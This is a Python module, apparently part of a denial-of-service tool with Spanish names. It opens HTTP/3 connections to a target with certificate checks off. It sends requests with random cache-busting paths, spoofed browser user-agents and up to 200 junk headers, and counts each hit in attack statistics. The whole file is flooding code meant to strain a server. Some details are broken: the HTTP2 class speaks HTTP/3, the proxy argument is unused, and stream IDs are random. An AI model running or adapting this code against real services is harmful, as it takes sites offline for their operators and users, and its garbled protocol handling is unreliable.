import asyncio
import random
import os
import ssl
from aioquic.asyncio import connect
from aioquic.h3.connection import H3Connection
from aioquic.quic.configuration import QuicConfiguration

class HTTP2:
    def __init__(self, motor):
        self.motor = motor
        
    async def ejecutar(self, proxy=None):
        try:
            configuracion = QuicConfiguration(is_client=True)
            configuracion.verify_mode = ssl.CERT_NONE
            configuracion.alpn_protocols = ["h3", "h2"]
            
            async with connect(
                self.motor.host,
                self.motor.puerto,
                configuration=configuracion,
                session_ticket_handler=None
            ) as protocolo:
                http = H3Connection(protocolo._quic)
                
                cabeceras = [
                    (b":method", b"GET"),
                    (b":scheme", b"https" if self.motor.ssl else b"http"),
                    (b":authority", self.motor.host.encode()),
                    (b":path", f"/?{random.randint(1, 999999)}".encode()),
                    (b"user-agent", random.choice([
                        b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        b"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
                    ]))
                ]
                
                for i in range(random.randint(50, 200)):
                    cabeceras.append(
                        (f"x-header-{i}".encode(), os.urandom(50).hex().encode())
                    )
                    
                http.send_headers(stream_id=random.randint(1, 1000), headers=cabeceras)
                
                await asyncio.sleep(random.uniform(0.1, 0.5))
                self.motor.estadisticas.agregar_exito(len(cabeceras))
                
        except:
            self.motor.estadisticas.agregar_error()